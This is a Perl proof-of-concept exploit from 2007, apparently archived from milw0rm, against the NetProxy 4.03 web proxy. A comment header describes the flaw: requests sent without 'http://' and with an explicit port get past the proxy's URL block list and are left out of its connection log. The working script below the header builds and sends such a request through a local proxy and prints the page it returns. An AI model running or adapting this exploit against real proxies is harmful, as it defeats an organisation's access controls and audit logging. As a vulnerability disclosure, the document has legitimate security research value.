#!/usr/bin/perl
###########################################################################
#
# Application: 
#
#	 NetProxy 4.03
#	 http://www.grok.co.uk/netproxy/index.html
#
# Description:
#
#	 NetProxy includes a powerful web cache to boost 
#	 performance and reduce online costs. There is 
#	 also an application-level firewall to protect your 
#	 network from unwanted access, full access logging 
#	 to allow you to track Internet usage, and 
#	 password-protected access to various Internet resources.
#
# Vulnerability:
#
#	 Sending a specially crafted request to the proxy server 
#	 allows users to view restricted Web content and bypass
#	 the logging feature.
#
# Exploit:
#
#	 Assume that access to http://www.milw0rm.com has been blocked. 
#	 The standard query string sent to NetProxy looks like:
#
#			GET http://www.milw0rm.com HTTP/1.0
#
#	 NetProxy recognizes that this is a blocked URL and subsequently 
#	 blocks the request. However, sending a request without 'http://' 
#	 in the URL allows access to the blocked URL (note that the port 
#	 must be manually specified as well):
#
#			GET www.milw0rm.com:80 HTTP/1.0
#
#	 In addition, requests made in this manner are not logged to 
# 	 NetProxy's connection log file. 
#
# Work-Around/Fix:
#
#	 Since the application automatically prepends the 'http://' string
#	 to every URL specified in the block list, this technique should work 
#	 for all restricted Web sites, and ensures that there is no easy fix 
#	 for this security hole. POC code follows.
#
# Credit:
#
#	 Exploit discovered and coded by Craig Heffner
#	 http://www.craigheffner.com
#	 heffnercj [at] gmail.com
###########################################################################

use IO::Socket;

#Define the NetProxy server and port
$proxy_ip = "127.0.0.1";
$proxy_port = "8080";

#Set the site, port and page to request
$site = "www.milw0rm.com";
$port = "80";
$page = "index.html";

#Define FF and IE user agent strings
$ms_ie = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)";
$ms_ff = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";

#Create connection to NetProxy
my $sock = new IO::Socket::INET(
			Proto => 'tcp',
			PeerAddr => $proxy_ip,
			PeerPort => $proxy_port,
			);
die "Failed to connect to [$proxy_ip:$proxy_port] : $!\n" unless $sock;	

#Format the request
$request = "GET $site:$port/$page HTTP/1.0\r\n";
$request .= "User-Agent: $ms_ff\r\n";
$request .= "\r\n";

#Send the request
print $sock $request;

#Read the reply
while(<$sock>){
	$reply .= $_;
}

close($sock);

#Separate NetProxy header from HTML
($header,$html) = split("\r\n\r",$reply);

print $html;

exit;

# milw0rm.com [2007-02-27]
